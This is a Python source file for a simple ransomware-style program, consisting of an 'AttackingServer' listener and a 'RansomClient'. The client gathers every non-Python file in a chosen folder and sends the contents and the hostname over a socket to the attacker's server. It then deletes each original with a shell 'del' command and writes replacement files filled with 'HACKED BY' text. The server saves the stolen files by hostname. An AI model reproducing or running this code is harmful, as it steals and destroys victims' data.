import socket
import ast
import os
import subprocess

class AttackingServer:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def start(self):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((self.ip, self.port))
            server.listen(5)

            while True:
                print("Waiting for connection....")
                client_socket, ipaddress = server.accept()
                print(f"Connection has been established with {ipaddress}")

                full_msg = client_socket.recv(1000000000).decode()

                alle_dateien = ast.literal_eval(full_msg)
                os.system(f"mkdir {alle_dateien['hostname']}")
                path = rf"{alle_dateien['hostname']}"
                os.chdir(path)

                for datei, inhalt in alle_dateien.items():
                    if datei == "hostname": continue
                    if datei.endswith(".txt"):
                        with open(rf"D:\CypherIt\{alle_dateien['hostname']}\{datei}","a+") as file:
                            file.write(str(inhalt))

                    else:
                        with open(rf"D:\CypherIt\{alle_dateien['hostname']}\{datei}","ab") as file:
                            file.write(inhalt)

        except OSError:
            raise OSError("Change the port number to run without an error")

class RansomClient:
    def __init__(self, ip , port, path, hacker):
        self.ip = ip
        self.port = port
        self.path = path
        self.hacker = hacker

    def hacked_by_someone(self):
        data = ""
        zahlen = [zahl for zahl in range(0, 308, 8)]
        for x in range(1, 301):
            data += f"HACKED BY {self.hacker} - "
            if x in zahlen:
                data += "\n"
        return data

    def start(self):
        os.chdir(rf"{self.path}")
        command = subprocess.run(["hostname"], capture_output=True).stdout.decode()
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((self.ip, self.port))

        path = os.listdir()
        lst = path.copy()
        dateien = []
        for dateiname in lst:
            if os.path.isfile(dateiname):
                if dateiname.endswith(".py"): continue
                dateien.append(dateiname)
        cmd = command.replace("\r\n", "")
        alle_dateien = {"hostname": cmd, }
        number = 0
        for endung in dateien:
            number += 1
            print(endung)
            if endung.endswith(".txt"):
                with open(endung, "r+") as file:
                    content = file.readlines()

                    alle_dateien[endung] = content

            with open(endung, "rb") as file:
                content = b""
                for line in file:
                    content += line

                alle_dateien[endung] = content

        client.send(str(alle_dateien).encode())

        for file in lst:
            data = ''.join(reversed(file))
            lst = []
            value = False
            for x in data:
                if value is True: continue
                lst.append(x)
                if "." == x:
                    value = True

            lst.remove(".")
            endung = ""
            for i in range(len(lst) - 1, -1, -1):
                endung += lst[i]

            datei = file.split(f"{endung}")
            filename = datei[0]
            os.system(f'del "{file}"')
            new_endung = f"{filename}txt"
            if endung == "txt":
                new_endung = f"{filename}docx"
                with open(new_endung, "wb") as the_file:
                    text = self.hacked_by_someone()
                    the_file.write(text.encode())

            with open(new_endung, "w+") as the_file:
                text = self.hacked_by_someone()
                the_file.write(text)
